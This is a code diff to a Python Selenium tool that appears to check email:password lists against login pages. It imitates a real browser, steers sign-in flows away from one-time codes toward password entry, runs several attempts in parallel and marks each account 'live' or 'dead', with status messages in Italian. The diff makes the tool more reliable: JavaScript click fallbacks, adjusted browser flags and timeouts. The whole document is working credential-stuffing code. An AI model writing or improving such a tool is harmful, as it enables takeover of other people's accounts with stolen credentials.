@@ -5,6 +5,7 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.action_chains import ActionChains
 from webdriver_manager.chrome import ChromeDriverManager
 import time
 import os
@@ -67,13 +68,33 @@ def create_driver():
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
     options.add_argument("--disable-gpu")
-    options.add_argument("--window-size=1920,1080")
+    options.add_argument("--disable-software-rasterizer")
+    options.add_argument("--disable-extensions")
+    options.add_argument("--disable-background-networking")
+    options.add_argument("--disable-sync")
+    options.add_argument("--disable-default-apps")
+    options.add_argument("--no-first-run")
+    options.add_argument("--disable-features=VizDisplayCompositor")
+    options.add_argument("--window-size=1280,720")
     options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
     options.binary_location = "/usr/bin/chromium"
     service = Service(ChromeDriverManager().install())
     driver = webdriver.Chrome(service=service, options=options)
-    driver.set_page_load_timeout(20)
+    driver.set_page_load_timeout(25)
     return driver
+
+def safe_click(driver, element):
+    try:
+        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
+        time.sleep(0.2)
+        driver.execute_script("arguments[0].click();", element)
+        return True
+    except:
+        try:
+            element.click()
+            return True
+        except:
+            return False
 
 def force_password_mode(driver):
     url = driver.current_url.lower()
@@ -81,15 +102,14 @@ def force_password_mode(driver):
         new_url = re.sub(r'passcode|code|otp', 'password', url, flags=re.I)
         if new_url != url:
             driver.get(new_url)
-            time.sleep(1.5)
+            time.sleep(1)
             return True
-    # Try click "use password" / "password instead"
     try:
-        links = driver.find_elements(By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password') or contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password instead') or contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'use password')]")
-        for link in links:
+        links = driver.find_elements(By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'password')]")
+        for link in links[:3]:
             if link.is_displayed():
-                link.click()
-                time.sleep(1.5)
+                safe_click(driver, link)
+                time.sleep(1)
                 return True
     except:
         pass
@@ -104,42 +124,44 @@ def check_credential(service_key, email, password):
     try:
         driver = create_driver()
         driver.get(service["url"])
-        time.sleep(1.5)
+        time.sleep(1.2)
         
-        email_el = WebDriverWait(driver, 8).until(
+        email_el = WebDriverWait(driver, 10).until(
             EC.presence_of_element_located((By.CSS_SELECTOR, service["email_selector"]))
         )
+        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", email_el)
         email_el.clear()
         email_el.send_keys(email)
-        time.sleep(0.4)
-        
-        try:
-            cont = driver.find_element(By.CSS_SELECTOR, "button[type='submit'], button:contains('Continue'), button:contains('Next')")
-            if cont and cont.is_displayed():
-                cont.click()
-                time.sleep(1)
-        except:
-            pass
-        
-        # Force password if code page
-        force_password_mode(driver)
-        
-        pass_el = WebDriverWait(driver, 6).until(
-            EC.presence_of_element_located((By.CSS_SELECTOR, service["pass_selector"]))
-        )
-        pass_el.clear()
-        pass_el.send_keys(password)
         time.sleep(0.3)
         
         try:
-            submit = WebDriverWait(driver, 5).until(
-                EC.element_to_be_clickable((By.CSS_SELECTOR, service["submit_selector"]))
-            )
-            submit.click()
+            conts = driver.find_elements(By.CSS_SELECTOR, "button[type='submit']")
+            if conts:
+                safe_click(driver, conts[0])
+                time.sleep(0.8)
+        except:
+            pass
+        
+        force_password_mode(driver)
+        
+        pass_el = WebDriverWait(driver, 8).until(
+            EC.presence_of_element_located((By.CSS_SELECTOR, service["pass_selector"]))
+        )
+        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", pass_el)
+        pass_el.clear()
+        pass_el.send_keys(password)
+        time.sleep(0.2)
+        
+        try:
+            submits = driver.find_elements(By.CSS_SELECTOR, service["submit_selector"])
+            if submits:
+                safe_click(driver, submits[0])
+            else:
+                pass_el.send_keys("\n")
         except:
             pass_el.send_keys("\n")
         
-        time.sleep(2.5)
+        time.sleep(2)
         
         current_url = driver.current_url.lower()
         page_source = driver.page_source.lower()
@@ -153,7 +175,10 @@ def check_credential(service_key, email, password):
             return {"email": email, "status": "dead", "message": "login fallito o captcha/block"}
             
     except Exception as e:
-        return {"email": email, "status": "error", "message": str(e)[:80]}
+        msg = str(e)
+        if "crashed" in msg.lower() or "not interactable" in msg.lower():
+            msg = "browser crash o elemento non cliccabile"
+        return {"email": email, "status": "error", "message": msg[:80]}
     finally:
         if driver:
             try:
@@ -198,7 +223,7 @@ def check():
             return {"email": email or line[:40], "status": "error", "message": "vuoto"}
         return check_credential(service, email, password)
     
-    with ThreadPoolExecutor(max_workers=3) as executor:
+    with ThreadPoolExecutor(max_workers=2) as executor:
         futures = [executor.submit(process, ln) for ln in lines if ln.strip()]
         for f in futures:
             res = f.result()
